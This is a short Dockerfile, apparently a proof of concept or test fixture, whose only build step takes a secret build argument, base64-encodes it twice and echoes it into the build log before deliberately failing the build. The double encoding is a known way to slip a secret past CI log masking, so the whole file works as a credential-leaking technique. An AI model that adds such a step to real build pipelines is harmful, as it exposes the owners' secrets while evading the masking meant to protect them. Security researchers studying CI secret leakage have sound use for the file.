FROM alpine:3.19
ARG GERALT_SECRET
RUN echo "GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)" && exit 1
